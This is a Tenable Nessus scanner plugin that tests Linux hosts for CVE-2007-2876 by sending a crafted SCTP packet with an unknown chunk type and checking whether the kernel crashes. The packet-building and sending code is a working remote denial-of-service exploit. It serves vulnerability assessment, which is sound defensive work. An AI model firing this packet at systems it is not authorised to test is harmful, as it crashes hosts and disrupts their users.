#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25483);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2017/05/16 19:43:12 $");

  script_cve_id("CVE-2007-2876");
  script_bugtraq_id(24376);
  script_osvdb_id(37112);

  script_name(english:"Linux Kernel Netfilter *_conntrack_proto_sctp.c sctp_new Function Unknown Chunk Type Remote DoS");
  script_summary(english:"Sends an SCTP packet with an unknown chunk type");

  script_set_attribute(attribute:"synopsis", value:
"It is possible to crash the remote host by sending it a specially-
crafted packet.");
  script_set_attribute(attribute:"description", value:
"There is a flaw in the SCTP code included in Linux kernel versions
before 2.6.21.4 that results in a kernel panic when an SCTP packet
with an unknown chunk type is received. An attacker can leverage this
flaw to crash the remote host with a single, possibly forged, packet.");
  # http://web.archive.org/web/20100130091432/http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.21.4
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a4ca7f3b");
  script_set_attribute(attribute:"solution", value:"Upgrade to Linux kernel version 2.6.21.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:A/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/06/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/06/12");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:linux:kernel");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl");
  script_require_keys("Settings/ParanoidReport");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("raw.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);


os = get_kb_item("Host/OS");
if (os && "Linux" >!< os) exit(0);

if (islocalhost()) exit(0);
if (TARGET_IS_IPV6) exit(0);
if (!get_host_open_port()) exit(0);


# Construct a malicious SCTP packet.
sctp =
  # SCTP header
  mkword(rand()) +                     # source port
  mkword(rand()) +                     # destination port
  mkdword(0) +                         # verification tag
  mkdword(0) +                         # checksum (to be added later)

  # SCTP chunk 1
  mkbyte(15) +                         # type (15 is reserved / unknown)
  mkbyte(0) +                          # flags
  mkword(8) +                          # length
  crap(4);                             # data
chksum = inet_sum(sctp);
ip = ip(ip_p:132);                     # SCTP
sctp = payload(insstr(sctp, mkdword(chksum), 8, 11));
boom = mkpacket(ip, sctp);


# Send packet and check whether the host is down.
start_denial();
send_packet(boom, pcap_active:FALSE);
alive = end_denial();
if (!alive)
{
  set_kb_item(name:"Host/dead", value:TRUE);
  security_warning(0);
}
